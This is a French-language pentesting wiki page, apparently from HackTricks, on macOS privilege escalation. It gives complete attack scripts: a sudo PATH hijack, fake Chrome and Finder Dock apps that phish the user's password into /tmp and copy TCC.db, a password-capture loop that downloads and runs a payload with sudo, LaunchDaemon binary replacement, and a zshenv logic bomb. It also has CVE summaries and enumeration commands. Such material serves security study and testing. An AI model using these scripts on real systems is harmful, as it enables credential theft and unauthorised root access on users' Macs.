# Élévation de privilèges macOS

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si vous êtes arrivé ici à la recherche d'une élévation de privilèges TCC, consultez :


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

De nombreuses techniques d'élévation de privilèges qui affectent Linux ou d'autres systèmes de type Unix s'appliquent également à macOS. Consultez :


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interaction avec l'utilisateur

### Sudo Hijacking

Vous trouverez la technique originale de [Sudo Hijacking dans l'article Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Cependant, macOS **conserve** le **`PATH`** de l'utilisateur lorsqu'il exécute **`sudo`**. Cela signifie qu'une autre façon de réaliser cette attaque consiste à **hijack d'autres binaires** que la victime exécutera également lorsqu'elle **exécute sudo :**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Notez qu’un utilisateur qui utilise le terminal aura très probablement **Homebrew installé**. Il est donc possible de détourner des binaires dans **`/opt/homebrew/bin`**.

### Usurpation du Dock

Grâce à la **social engineering**, vous pourriez **usurper par exemple Google Chrome** dans le Dock et exécuter votre propre script :

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Quelques suggestions :

- Vérifiez dans le Dock si Chrome est présent et, dans ce cas, **supprimez** cette entrée et **ajoutez** la **fausse** **entrée Chrome à la même position** dans le tableau du Dock.

<details>
<summary>Script d’usurpation de Chrome dans le Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Quelques suggestions :

- Vous **ne pouvez pas supprimer Finder du Dock**, donc si vous allez l'ajouter au Dock, vous pouvez placer le faux Finder juste à côté du vrai. Pour cela, vous devez **ajouter l'entrée du faux Finder au début du tableau du Dock**.
- Une autre option consiste à ne pas le placer dans le Dock, mais simplement à l'ouvrir : « Finder demande à contrôler Finder » n'est pas si étrange.
- Une autre option pour **escalate to root without asking** le mot de passe avec une horrible boîte de dialogue consiste à faire en sorte que Finder demande réellement le mot de passe pour effectuer une action privilégiée :
- Demander à Finder de copier dans **`/etc/pam.d`** un nouveau fichier **`sudo`** (L'invite demandant le mot de passe indiquera que « Finder veut copier sudo »)
- Demander à Finder de copier un nouvel **Authorization Plugin** (Vous pouvez contrôler le nom du fichier afin que l'invite demandant le mot de passe indique que « Finder veut copier Finder.bundle »)

<details>
<summary>Script d'usurpation du Dock Finder</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + réutilisation de sudo

Les malware abusent fréquemment de l’interaction avec l’utilisateur pour **capturer un mot de passe compatible avec sudo** et le réutiliser de manière programmatique. Déroulement courant :

1. Identifier l’utilisateur connecté avec `whoami`.
2. **Répéter les invites de mot de passe** jusqu’à ce que `dscl . -authonly "$user" "$pw"` renvoie un succès.
3. Mettre l’identifiant en cache (par exemple, `/tmp/.pass`) et exécuter des actions privilégiées avec `sudo -S` (mot de passe via l’entrée standard).

Exemple de chaîne minimale :
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Le mot de passe volé peut ensuite être réutilisé pour **supprimer la quarantaine de Gatekeeper avec `xattr -c`**, copier des LaunchDaemons ou d’autres fichiers privilégiés, et exécuter des étapes supplémentaires de manière non interactive.<sup>[[1]](#references)</sup>

## Vecteurs spécifiques aux versions récentes de macOS (2023–2026)

### `AuthorizationExecuteWithPrivileges` obsolète toujours utilisable

`AuthorizationExecuteWithPrivileges` a été rendu obsolète dans la version 10.7, mais **fonctionne toujours sur Sonoma/Sequoia**. De nombreux updaters commerciaux invoquent `/usr/libexec/security_authtrampoline` avec un chemin non approuvé. Si le binaire ciblé est modifiable par l’utilisateur, vous pouvez installer un trojan et profiter de l’invite légitime :
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combinez avec les **techniques de masquerading ci-dessus** pour présenter une boîte de dialogue de mot de passe crédible.


### Triage des helpers privilégiés / XPC

De nombreux privescs macOS modernes de logiciels tiers suivent le même schéma : un **LaunchDaemon root** expose un **service Mach/XPC** depuis **`/Library/PrivilegedHelperTools`**, puis le helper soit **ne valide pas le client**, le valide **trop tard** (race de PID), ou expose une **méthode root** qui consomme un **path/script contrôlé par l’utilisateur**. Il s’agit de la classe de bugs à l’origine de nombreux bugs récents affectant les helpers de clients VPN, de game launchers et d’updaters.<sup>[[2]](#references)</sup>

Checklist de triage rapide :
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Portez une attention particulière aux helpers qui :

- continuent d'accepter des requêtes **après leur désinstallation** parce que le job est resté chargé dans `launchd`
- exécutent des scripts ou lisent une configuration depuis **`/Applications/...`** ou d'autres chemins accessibles en écriture par des utilisateurs non-root
- reposent sur une validation du pair **basée sur le PID** ou **uniquement sur le bundle-id**, qui peut être vulnérable à une race condition

Pour plus de détails sur les bugs d'autorisation des helpers, consultez [cette page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Héritage de l'environnement des scripts PackageKit (CVE-2024-27822)

Jusqu'à ce qu'Apple corrige le problème dans **Sonoma 14.5**, **Ventura 13.6.7** et **Monterey 12.7.5**, les installations initiées par l'utilisateur via **`Installer.app`** / **`PackageKit.framework`** pouvaient exécuter des **scripts PKG en tant que root dans l'environnement de l'utilisateur actuel**. Ainsi, un package utilisant **`#!/bin/zsh`** chargeait le **`~/.zshenv`** de l'attaquant et l'exécutait en tant que **root** lorsque la victime installait le package.<sup>[[3]](#references)</sup>

C'est particulièrement intéressant comme **logic bomb** : il suffit d'avoir un **foothold** dans le compte de l'utilisateur et un fichier de démarrage du shell accessible en écriture, puis d'attendre qu'un installer vulnérable **basé sur zsh** soit exécuté par l'utilisateur. Cela ne s'applique généralement pas aux déploiements **MDM/Munki**, car ceux-ci s'exécutent dans l'environnement de l'utilisateur root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
If you want a deeper dive into installer-specific abuse, also check [cette page](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Collision de destination d'Installer via `.localized`

Certains installateurs tiers enregistrent un LaunchDaemon root dont l'exécutable est référencé par un chemin fixe à l'intérieur de `/Applications/Target.app`. Si un attaquant peut créer ce bundle en premier avec un **identifiant de bundle différent**, Installer peut conserver le leurre et placer l'application réelle dans `/Applications/Target.localized/Target.app`. Le daemon pointe toujours vers le chemin d'origine. Par conséquent, un exécutable contrôlé par l'attaquant à l'intérieur du bundle leurre peut ensuite s'exécuter avec les privilèges root.<sup>[[8]](#references)</sup>

Les prérequis importants sont les suivants :<sup>[[8]](#references)</sup>

1. L'attaquant peut créer ou contrôler le chemin d'application attendu.
2. Le package ne supprime pas le bundle en conflit.
3. Le job privilégié utilise un chemin codé en dur à l'intérieur de ce bundle.
4. L'utilisateur ou un workflow MDM installe le package et enregistre le job.

Recherchez les bundles déplacés, puis examinez les cibles des LaunchDaemon avec la boucle d'énumération de la section suivante :<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Un installateur plus sûr résout l’emplacement final du bundle et conserve les exécutables privilégiés dans un emplacement appartenant à root, comme `/Library/PrivilegedHelperTools`. Il doit également vérifier la propriété et la signature du code avant d’enregistrer ou de démarrer le job.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

Un plist de LaunchDaemon peut appartenir à root alors que son `Program` ou sa première entrée `ProgramArguments` pointe vers un répertoire accessible en écriture par un utilisateur. Vérifiez **l’ensemble du chemin**, et pas seulement les permissions de l’exécutable. Si le répertoire parent est accessible en écriture, un attaquant peut renommer un exécutable appartenant à root et créer un remplacement au même emplacement. Le remplacement s’exécute avec les privilèges root au prochain démarrage du job. Un redémarrage ou un redémarrage normal du service suffit. L’attaquant n’a pas besoin de l’autorisation d’exécuter `launchctl bootstrap` dans le domaine système.<sup>[[7]](#references)</sup>

Énumérez d’abord chaque cible et son parent immédiat :<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Lorsque le fichier ou son répertoire parent est accessible en écriture, conservez le binaire d’origine et remplacez le chemin par un payload exécutable. Attendez ensuite que le daemon déjà chargé redémarre.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Le chemin vulnérable `kauth_cred_proc_update` mettait à jour `proc_ro.p_ucred` avec l’API non atomique `zalloc_ro_mut`, tandis que les lecteurs SMR chargeaient le pointeur sans verrou. Le déclencheur public utilise un binaire setgid spécialement préparé. Un thread alterne entre ses identifiants de groupe réel et effectif, tandis qu’un autre thread exécute de façon répétée un syscall tel que `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Considérez ceci comme une **primitive de race**, et non comme un exploit root prêt à l'emploi. Le PoC publié démontre un pointeur de credentials déchiré. Il se termine généralement par un kernel panic. Le chercheur n'a reproduit la corruption que sur Intel et n'a pas fourni de contrôle déterministe de l'objet de credentials résultant. Apple a remplacé la mise à jour par un échange atomique de pointeur dans macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

Si vous avez déjà les privilèges root, SIP bloque toujours les écritures dans les emplacements système. Le bug **Migraine** exploite l'entitlement de Migration Assistant `com.apple.rootless.install.heritable` pour lancer un processus enfant qui hérite du SIP bypass et écrase des chemins protégés (par exemple, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> La chaîne :

1. Obtenir les privilèges root sur un système actif.
2. Déclencher `systemmigrationd` avec un état conçu pour exécuter un binaire contrôlé par l'attaquant.
3. Utiliser l'entitlement hérité pour modifier des fichiers protégés par SIP, en assurant la persistence même après un redémarrage.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Plusieurs daemons Apple acceptent des objets **NSPredicate** via XPC et valident uniquement le champ `expressionType`, qui est contrôlé par l'attaquant. En concevant un predicate qui évalue des selectors arbitraires, vous pouvez obtenir une **code execution dans des services XPC root/system** (par exemple, `coreduetd`, `contextstored`). Combiné à un initial app sandbox escape, cela permet une **privilege escalation sans prompts utilisateur**. Recherchez les endpoints XPC qui désérialisent les predicates et ne disposent pas d'un visitor robuste.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même sans privilèges) peut créer et monter un snapshot Time Machine avec `-o noowners` et **accéder à TOUS les fichiers** de ce snapshot, en contournant les vérifications de propriété du volume actif. Le seul privilège requis est que l'application utilisée (comme `Terminal`) dispose de **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Les commandes et l'explication complète se trouvent sur la page TCC bypasses :

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informations sensibles

Cela peut être utile pour effectuer une privilege escalation :


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, l'année de l'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165 : Local Privilege Escalation d'AWS Client VPN pour macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822 : Privilege Escalation de macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE : CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" : SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Une nouvelle classe de bugs de Privilege Escalation sur macOS et iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking : privilege escalation et persistence via des permissions de dossiers non sécurisées](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE via le répertoire .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
